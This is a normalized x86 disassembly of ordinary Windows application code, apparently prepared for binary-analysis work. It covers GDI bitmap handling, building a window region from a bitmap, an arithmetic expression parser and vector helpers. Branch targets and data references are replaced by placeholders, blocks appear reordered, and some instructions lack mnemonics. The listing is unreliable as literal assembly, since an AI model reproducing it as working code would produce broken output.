mov edx [ esi + 0x10 ]
push ecx
push edx
mov edx [ esi + 0xc ]
mov [ esi + 0x8 ] eax
call sub_4417b0
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x18 ]
mov [ eax + 0x10 ] ecx
mov ecx [ esi + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
push edi
call eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_43d3d0
push ebx
mov ebx [ _wcsicmp@IAT ]
push esi
push edi
mov edi eax
mov esi rw-data
mov esi [ esi + 0x4 ]
jmp r-xdata
add esi 0x8
cmp esi rw-data
jl r-xdata
mov edi rw-data
nop
mov eax [ esi ]
push eax
push edi
call ebx
add esp 0x8
test eax eax
je r-xdata
mov esi edi
mov eax edi
pop edi
pop esi
pop ebx
retn
add edi 0x20
cmp edi rw-data
jl r-xdata
mov ecx [ edi ]
push ecx
push esi
call ebx
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
sub_43d430
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_43d470
push ebp
mov ebp esp
sub esp 0xa0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
xor ebx ebx
push ebx
push ebx
push ebx
push r--data
mov [ ebp - 0x70 ] eax
call [ CreateDCW@IAT ]
mov esi [ GetDeviceCaps@IAT ]
mov edi eax
push 0xc
push edi
mov [ ebp - 0x84 ] edi
call esi
push 0xe
push edi
mov [ ebp - 0x60 ] eax
call esi
mov esi eax
imul esi [ ebp - 0x60 ]
push edi
call [ DeleteDC@IAT ]
cmp esi 0x1
jg r-xdata
cmp esi 0x4
jg r-xdata
mov [ ebp - 0x64 ] 0x1
jmp r-xdata
xor ecx ecx
cmp esi 0x8
setg cl
dec ecx
and ecx 0xfffffff0
add ecx 0x18
mov [ ebp - 0x64 ] ecx
mov [ ebp - 0x64 ] 0x4
jmp r-xdata
mov eax [ ebp - 0x70 ]
lea edx [ ebp - 0xa0 ]
push edx
push 0x18
push eax
call [ GetObjectW@IAT ]
mov eax [ ebp - 0x64 ]
mov ecx [ ebp - 0x9c ]
mov [ ebp - 0x22 ] ax
mov esi [ ebp - 0x98 ]
movzx eax ax
imul eax ecx
add eax 0x1f
mov edx 0x1
mov [ ebp - 0x24 ] dx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
imul eax esi
add eax eax
add eax eax
add eax 0x28
push eax
push 0x42
mov [ ebp - 0x30 ] 0x28
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x68 ] eax
call [ GlobalAlloc@IAT ]
push eax
mov [ ebp - 0x60 ] eax
call [ GlobalLock@IAT ]
mov edi eax
mov ecx 0xa
lea esi [ ebp - 0x30 ]
push 0xf
mov [ ebp - 0x6c ] eax
[ edi ] [ esi ]
call [ GetStockObject@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
mov esi [ ebp - 0x84 ]
mov edi ebx
push ebx
call [ GetDC@IAT ]
push ebx
mov esi eax
push edi
push esi
call [ SelectPalette@IAT ]
push esi
mov edi eax
call [ RealizePalette@IAT ]
jmp r-xdata
mov edi [ ebp - 0x68 ]
mov edx 0x4d42
mov [ ebp - 0x80 ] dx
lea edx [ edi + 0xf ]
xor eax eax
push edx
mov [ ebp - 0x7e ] edi
mov [ ebp - 0x7a ] eax
mov [ ebp - 0x76 ] 0x36
call sub_443fa9
mov ecx [ ebp - 0x7c ]
mov edx [ ebp - 0x78 ]
mov esi eax
mov eax [ ebp - 0x80 ]
mov [ esi ] eax
mov ax [ ebp - 0x74 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp - 0x6c ]
mov [ esi + 0x8 ] edx
push edi
push ecx
lea edx [ esi + 0xe ]
push edx
mov [ esi + 0xc ] ax
call memcpy
push 0x2c
lea eax [ ebp - 0x5c ]
push ebx
push eax
mov [ esi + edi + 0xe ] bl
call memset
mov ecx [ ebp - 0x9c ]
mov edx [ ebp - 0x98 ]
add esp 0x1c
mov [ ebp - 0x58 ] ecx
mov cx [ ebp - 0x64 ]
mov eax 0x1
push ebx
mov [ ebp - 0x5c ] 0x28
mov [ ebp - 0x54 ] edx
mov [ ebp - 0x50 ] ax
mov [ ebp - 0x4e ] cx
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x3c ] ebx
call [ GetDC@IAT ]
push ebx
mov edi eax
lea edx [ ebp - 0x5c ]
push edx
lea eax [ esi + 0x36 ]
push eax
push 0x4
lea ecx [ ebp - 0x30 ]
push ecx
push edi
call [ CreateDIBitmap@IAT ]
mov edx [ ebp - 0x60 ]
push edx
mov [ ebp - 0x68 ] eax
call [ GlobalUnlock@IAT ]
mov eax [ ebp - 0x60 ]
push eax
call [ GlobalFree@IAT ]
push esi
call [ `placement delete closure'@IAT ]
add esp 0x4
push edi
push ebx
call [ ReleaseDC@IAT ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x68 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
push 0x1
push edi
push esi
call [ SelectPalette@IAT ]
push esi
call [ RealizePalette@IAT ]
push esi
push ebx
call [ ReleaseDC@IAT ]
mov eax [ ebp - 0x6c ]
mov ecx [ ebp - 0x70 ]
push ebx
push eax
add eax 0x28
push eax
mov eax [ ebp - 0x98 ]
push eax
push ebx
push ecx
push esi
call [ GetDIBits@IAT ]
cmp edi ebx
je r-xdata
sub_43d6f0
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
push ebx
mov ebx [ CreateCompatibleDC@IAT ]
push esi
push edi
push 0x0
mov edi ecx
mov [ ebp - 0x3c ] 0x0
call ebx
mov esi eax
mov [ ebp - 0x44 ] esi
test esi esi
je r-xdata
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x3c ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x7c ]
push eax
push 0x18
push edi
call [ GetObjectW@IAT ]
mov edx [ ebp - 0x74 ]
mov ecx [ ebp - 0x78 ]
xor eax eax
push eax
push eax
mov [ ebp - 0x28 ] edx
lea edx [ ebp - 0x98 ]
push edx
push eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x30 ]
push eax
push esi
mov [ ebp - 0x30 ] 0x28
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x24 ] 0x200001
call [ CreateDIBSection@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x44 ]
push eax
call [ DeleteDC@IAT ]
mov ecx [ ebp - 0x44 ]
push esi
push ecx
call [ SelectObject@IAT ]
mov edx [ ebp - 0x44 ]
push edx
mov [ ebp - 0x5c ] eax
call ebx
mov ebx eax
mov [ ebp - 0x60 ] ebx
test ebx ebx
je r-xdata
mov ecx [ ebp - 0x5c ]
mov edx [ ebp - 0x44 ]
push ecx
push edx
call [ SelectObject@IAT ]
push eax
call [ DeleteObject@IAT ]
lea eax [ ebp - 0x94 ]
push eax
push 0x18
push esi
call [ GetObjectW@IAT ]
mov eax [ ebp - 0x88 ]
mov ecx eax
and ecx 0x80000003
jns r-xdata
je r-xdata
dec ecx
or ecx 0xfffffffc
inc ecx
push edi
push ebx
call [ SelectObject@IAT ]
mov ecx [ ebp - 0x78 ]
mov edx [ ebp - 0x44 ]
push 0xcc0020
push 0x0
push 0x0
push ebx
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x74 ]
push eax
push ecx
push 0x0
push 0x0
push edx
call [ BitBlt@IAT ]
push 0x660
push 0x2
mov [ ebp - 0x40 ] 0x64
call [ GlobalAlloc@IAT ]
mov edi eax
push edi
mov [ ebp - 0x50 ] edi
call [ GlobalLock@IAT ]
mov esi eax
xor eax eax
push eax
push eax
push 0x7fffffff
mov [ esi + 0xc ] eax
mov [ esi + 0x8 ] eax
push 0x7fffffff
lea eax [ esi + 0x10 ]
push eax
mov [ esi ] 0x20
mov [ esi + 0x4 ] 0x1
call [ SetRect@IAT ]
mov eax [ ebp + 0x8 ]
mov ecx eax
mov edx eax
movzx eax al
mov ebx 0xff
shr ecx 0x8
shr edx 0x10
add eax 0x10
mov [ ebp - 0x35 ] cl
mov [ ebp - 0x34 ] dl
mov [ ebp - 0x33 ] bl
cmp eax ebx
jg r-xdata
jmp r-xdata
movzx eax cl
add eax 0x10
mov [ ebp - 0x31 ] bl
cmp eax ebx
jg r-xdata
mov [ ebp - 0x33 ] al
inc eax
mov edx eax
and edx 0x80000003
jns r-xdata
movzx eax dl
add eax 0x10
mov [ ebp - 0x32 ] bl
cmp eax ebx
jg r-xdata
mov [ ebp - 0x31 ] al
jne r-xdata
dec edx
or edx 0xfffffffc
inc edx
mov ecx [ ebp - 0x8c ]
dec ecx
imul ecx [ ebp - 0x88 ]
add ecx [ ebp - 0x80 ]
cmp [ ebp - 0x74 ] 0x0
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x48 ] 0x0
jle r-xdata
mov [ ebp - 0x32 ] al
mov [ ebp - 0x88 ] eax
mov edx [ ebp - 0x40 ]
add edx 0x2
push esi
shl edx 0x4
push edx
push 0x0
call [ ExtCreateRegion@IAT ]
mov esi eax
mov eax [ ebp - 0x3c ]
test eax eax
je r-xdata
mov edx [ ebp - 0x78 ]
mov [ ebp - 0x3c ] esi
push 0x2
push esi
push eax
push eax
call [ CombineRgn@IAT ]
push esi
call [ DeleteObject@IAT ]
jmp r-xdata
mov eax [ ebp - 0x48 ]
sub ecx [ ebp - 0x88 ]
inc eax
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x48 ] eax
cmp eax [ ebp - 0x74 ]
jl r-xdata
mov eax [ ebp - 0x40 ]
add eax 0x2
shl eax 0x4
mov [ ebp - 0x54 ] eax
push edi
call [ GlobalFree@IAT ]
mov eax [ ebp - 0x64 ]
mov esi [ ebp - 0x60 ]
push eax
push esi
call [ SelectObject@IAT ]
push esi
call [ DeleteDC@IAT ]
test edi edi
je r-xdata
xor edi edi
test edx edx
jle r-xdata
mov edi [ ebp - 0x50 ]
mov ecx [ ebp - 0x58 ]
inc edi
cmp edi edx
jl r-xdata
mov cl [ eax ]
cmp cl [ ebp + 0x8 ]
jb r-xdata
mov [ ebp - 0x4c ] edi
lea eax [ ecx + edi * 4 ]
cmp edi edx
jge r-xdata
inc edi
add eax 0x4
cmp edi edx
jl r-xdata
cmp cl [ ebp - 0x33 ]
ja r-xdata
cmp edi [ ebp - 0x4c ]
jle r-xdata
mov cl [ eax + 0x1 ]
cmp cl [ ebp - 0x35 ]
jb r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x40 ]
jb r-xdata
cmp cl [ ebp - 0x31 ]
ja r-xdata
mov ebx [ ebp - 0x48 ]
mov eax [ esi + 0x8 ]
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x4c ]
inc ebx
push ebx
push edi
add eax 0x2
push ecx
shl eax 0x4
push edx
add eax esi
push eax
call [ SetRect@IAT ]
mov eax [ ebp - 0x4c ]
cmp eax [ esi + 0x10 ]
jge r-xdata
mov esi [ ebp - 0x50 ]
push esi
call [ GlobalUnlock@IAT ]
mov eax [ ebp - 0x54 ]
add [ ebp - 0x40 ] 0x64
add eax 0x640
push 0x2
push eax
push esi
mov [ ebp - 0x54 ] eax
call [ GlobalReAlloc@IAT ]
push eax
mov [ ebp - 0x50 ] eax
call [ GlobalLock@IAT ]
mov esi eax
mov cl [ eax + 0x2 ]
cmp cl [ ebp - 0x34 ]
jb r-xdata
mov eax [ ebp - 0x48 ]
cmp eax [ esi + 0x14 ]
jge r-xdata
mov [ esi + 0x10 ] eax
cmp cl [ ebp - 0x32 ]
jbe r-xdata
cmp edi [ esi + 0x18 ]
jle r-xdata
mov [ esi + 0x14 ] eax
cmp ebx [ esi + 0x1c ]
jle r-xdata
mov [ esi + 0x18 ] edi
inc [ esi + 0x8 ]
cmp [ esi + 0x8 ] 0x7d0
jne r-xdata
mov [ esi + 0x1c ] ebx
mov edx [ ebp - 0x78 ]
mov ecx [ ebp - 0x54 ]
push esi
push ecx
push 0x0
call [ ExtCreateRegion@IAT ]
mov ebx eax
mov eax [ ebp - 0x3c ]
test eax eax
je r-xdata
mov [ ebp - 0x3c ] ebx
push 0x2
push ebx
push eax
push eax
call [ CombineRgn@IAT ]
push ebx
call [ DeleteObject@IAT ]
jmp r-xdata
push 0x0
push 0x0
push 0x7fffffff
push 0x7fffffff
lea eax [ esi + 0x10 ]
push eax
mov [ esi + 0x8 ] 0x0
call [ SetRect@IAT ]
sub_43dac0
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
mov eax edx
sub eax ecx
sar eax 0x2
cmp eax 0x2
jge r-xdata
push edi
mov edi [ ecx + eax * 4 - 0x4 ]
mov eax [ ecx + eax * 4 - 0x8 ]
cmp ecx edx
je r-xdata
xor al al
pop esi
mov esp ebp
pop ebp
retn
mov edx [ esi + 0x4 ]
cmp ecx edx
je r-xdata
add edx 0xfffffffc
mov [ esi + 0x4 ] edx
movsx ecx [ ebp + 0x8 ]
add ecx 0xffffffdb
mov [ ebp - 0x4 ] 0x0
cmp ecx 0xa
ja r-xdata
add edx 0xfffffffc
mov [ esi + 0x4 ] edx
lea ecx [ ebp - 0x4 ]
call sub_428170
pop edi
mov al 0x1
pop esi
mov esp ebp
pop ebp
retn
movzx ecx [ ecx + lookup_table_43dbb4 ]
jmp [ ecx * 4 + jump_table_43db9c ]
add eax edi
mov [ ebp - 0x4 ] eax
sub eax edi
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
call sub_428170
pop edi
mov al 0x1
pop esi
mov esp ebp
pop ebp
retn
imul eax edi
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
call sub_428170
pop edi
mov al 0x1
pop esi
mov esp ebp
pop ebp
retn
test edi edi
je r-xdata
test edi edi
je r-xdata
pop edi
xor al al
pop esi
mov esp ebp
pop ebp
retn
cdq
idiv edi
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
call sub_428170
pop edi
mov al 0x1
pop esi
mov esp ebp
pop ebp
retn
cdq
idiv edi
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] edx
call sub_428170
pop edi
mov al 0x1
pop esi
mov esp ebp
pop ebp
retn
sub_43dbc0
push ebp
mov ebp esp
push 0xffffffff
push sub_4456fa
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor edi edi
mov [ ebp - 0x4c ] edi
mov [ ebp - 0x48 ] edi
mov [ ebp - 0x44 ] edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp + 0x8 ]
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x18 ] 0xffffffff
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x1c ] edi
cmp eax edi
jle r-xdata
mov esi [ ebp - 0x48 ]
sub esi edi
je r-xdata
mov ecx [ ebp - 0x1c ]
mov eax [ ebp + 0x8 ]
mov bl [ eax + ecx * 2 ]
mov [ ebp - 0x12 ] bl
cmp bl 0x20
jne r-xdata
mov eax [ ebp - 0x38 ]
mov ecx [ ebp - 0x3c ]
sub eax ecx
sar eax 0x2
cmp eax 0x1
jne r-xdata
lea esp [ esp ]
lea edx [ ebx - 0x30 ]
cmp dl 0x9
jbe r-xdata
cmp [ ebp - 0x18 ] 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov esi [ operator delete@IAT ]
xor eax eax
cmp ecx eax
je r-xdata
mov eax ecx
mov edi [ eax ]
mov [ ebp - 0x4 ] 0x0
mov esi [ operator delete@IAT ]
push eax
call esi
xor ebx ebx
add esp 0x4
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x4c ]
cmp eax ebx
je r-xdata
mov edx [ ebp - 0x2c ]
push edx
lea eax [ ebp - 0x3c ]
dec esi
call sub_43dac0
add esp 0x4
test al al
je r-xdata
dec [ ebp - 0x48 ]
cmp bl 0x2d
je r-xdata
cmp bl 0x2d
je r-xdata
mov eax [ ebp - 0x1c ]
inc eax
mov [ ebp - 0x1c ] eax
cmp eax [ ebp - 0x24 ]
jl r-xdata
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x4 ] 0xffffffff
cmp edi eax
je r-xdata
mov eax [ ebp - 0x3c ]
push eax
call esi
add esp 0x4
xor eax eax
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x44 ] ebx
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call esi
add esp 0x4
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x3c ]
mov esi [ operator delete@IAT ]
xor ebx ebx
cmp eax ebx
je r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x24 ]
dec eax
cmp ecx eax
jge r-xdata
cmp bl 0x2b
jne r-xdata
cmp bl 0x2b
jne r-xdata
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x44 ] eax
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
call esi
add esp 0x4
xor eax eax
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x4 ] 0xffffffff
cmp edi ebx
je r-xdata
push eax
call esi
add esp 0x4
mov cl [ edi + esi - 0x1 ]
mov [ ebp - 0x2c ] cl
cmp edi [ ebp - 0x48 ]
je r-xdata
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov edx [ ebp + 0x8 ]
mov al [ edx + ecx * 2 + 0x2 ]
sub al 0x30
cmp al 0x9
ja r-xdata
cmp [ ebp - 0x18 ] 0xffffffff
jne r-xdata
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x44 ] ebx
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
call esi
add esp 0x4
mov [ ebp - 0x11 ] 0x0
cmp bl 0x28
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
lea eax [ ecx + edx * 2 ]
push eax
call [ _wtoi@IAT ]
lea ecx [ ebp - 0x20 ]
add esp 0x4
mov esi eax
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x18 ] 0xffffffff
cmp ecx [ ebp - 0x38 ]
jae r-xdata
test ecx ecx
je r-xdata
mov eax [ ebp - 0x24 ]
dec eax
cmp ecx eax
je r-xdata
mov [ ebp - 0x18 ] ecx
cmp bl 0x29
jne r-xdata
lea ecx [ ebp - 0x12 ]
lea esi [ ebp - 0x4c ]
call sub_43e010
mov [ ebp - 0x11 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x38 ]
cmp eax [ ebp - 0x34 ]
jne r-xdata
mov edx ecx
mov ecx [ ebp - 0x3c ]
cmp ecx edx
ja r-xdata
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov [ ebp - 0x11 ] 0x0
jmp r-xdata
cmp bl 0x2b
je r-xdata
mov ecx [ ebp - 0x48 ]
mov esi ecx
sub esi edi
mov al [ edi + esi - 0x1 ]
mov [ ebp - 0x28 ] al
cmp edi ecx
je r-xdata
mov edi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x3
test eax eax
je r-xdata
lea ecx [ ebp - 0x3c ]
call sub_413540
mov eax [ ebp - 0x38 ]
mov eax [ ebp - 0x38 ]
mov esi edx
sub esi ecx
sar esi 0x2
cmp eax [ ebp - 0x34 ]
jne r-xdata
mov eax [ ebp - 0x48 ]
sub eax edi
mov [ ebp - 0x11 ] 0x1
test eax eax
jle r-xdata
cmp bl 0x2d
je r-xdata
cmp al 0x28
je r-xdata
dec ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x4 ] 0x1
add eax 0x4
mov [ ebp - 0x38 ] eax
mov [ eax ] esi
mov [ ebp - 0x4 ] 0x2
test eax eax
je r-xdata
lea ecx [ ebp - 0x3c ]
call sub_413540
mov eax [ ebp - 0x38 ]
mov ecx [ ebp - 0x3c ]
mov eax [ ebp - 0x38 ]
sub eax [ ebp - 0x3c ]
sar eax 0x2
test eax eax
jne r-xdata
mov al [ edi + eax - 0x1 ]
mov [ ebp - 0x2c ] al
movsx eax al
add eax 0xffffffdb
cmp eax 0xa
ja r-xdata
cmp bl 0x2a
je r-xdata
mov ebx [ ebp - 0x48 ]
mov ecx [ ecx + esi * 4 ]
mov [ eax ] ecx
jmp r-xdata
lea ecx [ ebp - 0x12 ]
lea esi [ ebp - 0x4c ]
call sub_43e010
lea ecx [ ebp - 0x20 ]
lea esi [ ebp - 0x3c ]
mov [ ebp - 0x20 ] eax
call sub_428170
xor ecx ecx
jmp [ eax * 4 + jump_table_43dfb0 ]
cmp bl 0x2f
je r-xdata
mov al [ edi + esi - 0x2 ]
dec esi
mov [ ebp - 0x28 ] al
cmp edi ebx
je r-xdata
xor eax eax
jmp [ eax * 4 + jump_table_43dfdc ]
mov ecx 0x1
jmp r-xdata
or ecx 0xffffffff
jmp r-xdata
cmp bl 0x25
jne r-xdata
cmp al 0x28
jne r-xdata
dec ebx
mov [ ebp - 0x48 ] ebx
mov eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x3c ]
call sub_43dac0
add esp 0x4
test al al
je r-xdata
mov eax 0x1
jmp r-xdata
movsx eax bl
add eax 0xffffffdb
cmp eax 0xa
ja r-xdata
mov edx [ ebp - 0x28 ]
push edx
lea eax [ ebp - 0x3c ]
call sub_43dac0
add esp 0x4
test al al
je r-xdata
jmp r-xdata
cmp edi [ ebp - 0x48 ]
je r-xdata
cmp ecx eax
jl r-xdata
dec [ ebp - 0x48 ]
sub_43e010
push ebp
mov ebp esp
push 0xffffffff
push sub_444fda
mov eax [ fs : 0x0 ]
push eax
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov eax [ esi + 0x4 ]
cmp edi eax
jae r-xdata
cmp eax [ esi + 0x8 ]
jne r-xdata
mov ecx [ esi ]
cmp ecx edi
ja r-xdata
mov eax [ esi + 0x4 ]
mov ecx 0x1
mov [ ebp - 0x4 ] ecx
test eax eax
je r-xdata
mov ecx esi
call sub_43e0c0
sub edi ecx
cmp eax [ esi + 0x8 ]
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
add [ esi + 0x4 ] ecx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov esp ebp
pop ebp
retn
mov dl [ edi ]
mov [ eax ] dl
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
mov [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
mov ecx esi
call sub_43e0c0
mov [ ebp - 0x4 ] 0xffffffff
inc [ esi + 0x4 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov esp ebp
pop ebp
retn
mov al [ eax + edi ]
mov [ ecx ] al
sub_43e0c0
mov eax [ ecx + 0x4 ]
push esi
mov esi [ ecx ]
sub eax esi
cmp eax 0xfffffffe
jbe r-xdata
mov edx [ ecx + 0x8 ]
inc eax
sub edx esi
cmp eax edx
jbe r-xdata
push r--data
call [ std::_Xlength_error@IAT ]
pop esi
retn
push edi
mov esi edx
or edi 0xffffffff
shr esi 0x1
sub edi esi
cmp edi edx
pop edi
jae r-xdata
add edx esi
xor edx edx
jmp r-xdata
push edx
call sub_43e110
mov edx eax
cmp edx eax
jae r-xdata
sub_43e110
push ebp
mov ebp esp
push 0xffffffff
push sub_444f20
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov ecx [ ebp + 0x8 ]
cmp ecx 0xffffffff
jbe r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
cmp eax ecx
jae r-xdata
push r--data
call [ std::_Xlength_error@IAT ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_43e1e0
mov ebx eax
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
sub eax ecx
push eax
push ecx
push ebx
call [ memmove@IAT ]
add esp 0xc
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov edi [ esi + 0x4 ]
sub edi eax
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
lea edx [ ebx + ecx ]
mov [ esi + 0x8 ] edx
add edi ebx
mov [ esi + 0x4 ] edi
mov [ esi ] ebx
push eax
call [ operator delete@IAT ]
add esp 0x4
sub_43e1e0
push ebp
mov ebp esp
push 0xffffffff
push sub_445259
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor eax eax
test ecx ecx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
cmp ecx 0xffffffff
ja r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x10 ] 0x0
call [ std::exception::exception@IAT ]
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x1c ] r--data
mov [ ebp - 0x4 ] 0xffffffff
push r--data
lea ecx [ ebp - 0x1c ]
push ecx
call _CxxThrowException
push ecx
call [ operator new@IAT ]
add esp 0x4
test eax eax
jne r-xdata
sub_43e270
push ebp
mov ebp esp
push 0xffffffff
push sub_4476ae
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_40e3c0
mov [ ebp - 0x4 ] 0x0
mov [ esi + 0x70 ] r--data
mov al 0x1
mov [ ebp - 0x4 ] al
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x68 ] al
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea edi [ esi + 0x78 ]
mov ecx rw-data
mov [ ebp - 0x10 ] edi
call edx
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x4
mov [ esi + 0xc ] 0x11
mov [ esi + 0x74 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_43e320
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_43e350
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_43e350
push ebp
mov ebp esp
push 0xffffffff
push sub_445a8e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
xor ecx ecx
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0x78 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
